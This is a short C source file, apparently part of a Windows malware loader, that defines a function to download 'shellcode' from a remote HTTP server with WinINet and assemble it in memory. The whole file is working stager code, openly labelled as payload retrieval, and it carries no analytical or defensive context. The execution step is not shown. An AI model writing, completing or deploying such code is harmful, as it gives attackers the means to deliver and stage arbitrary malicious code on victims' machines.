#include "GetFromRemote.h"
#include <Windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment (lib, "Wininet.lib")

// The function to download the shellcode from the remote server
BOOL GetPayloadFromHTTPServer(IN LPCSTR Url, IN PBYTE* ppShellcodeBytes, IN SIZE_T* psShellcodeBytes) {

    // A handle is created to initiate the connection
    HINTERNET hSession = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hSession == NULL) {
        printf("[!] Failed to open a session, Error: %d \n", GetLastError());
        return FALSE;
    }

    // The file is downloaded
    HINTERNET hSessionFile = InternetOpenUrlA(hSession, Url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hSessionFile == NULL) {
        printf("[!] Failed to download the payload, Error: %d \n", GetLastError());
        InternetCloseHandle(hSession);
        return FALSE;
    }

    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pShellcode = NULL;
    PBYTE pTempShellcode = (PBYTE)LocalAlloc(LPTR, 512);

    if (pTempShellcode == NULL) {
        InternetCloseHandle(hSessionFile);
        InternetCloseHandle(hSession);
        return FALSE;
    }

    // Since InternetReadFile needs the size of the file, we need to do this loops to dynamically retrieve the size of the file
    while (TRUE) {
        if (!InternetReadFile(hSessionFile, pTempShellcode, 512, &dwBytesRead) || dwBytesRead == 0) {
            if (GetLastError() != ERROR_SUCCESS) {
                printf("[!] Failed to read the payload! Error: %d \n", GetLastError());
            }
            break;
        }
        sSize += dwBytesRead;

        if (pShellcode == NULL) {
            pShellcode = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        }
        else {
            pShellcode = (PBYTE)LocalReAlloc(pShellcode, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pShellcode == NULL) {
            LocalFree(pTempShellcode);
            InternetCloseHandle(hSessionFile);
            InternetCloseHandle(hSession);
            return FALSE;
        }

        memcpy((PVOID)(pShellcode + (sSize - dwBytesRead)), pTempShellcode, dwBytesRead);
        memset(pTempShellcode, 0x00, dwBytesRead);
    }

    printf("\n[i] Payload successfully retrieved! Size: %zu bytes \n", sSize);

    *ppShellcodeBytes = pShellcode;
    *psShellcodeBytes = sSize;

    LocalFree(pTempShellcode);
    InternetCloseHandle(hSessionFile);
    InternetCloseHandle(hSession);

    return TRUE;
}
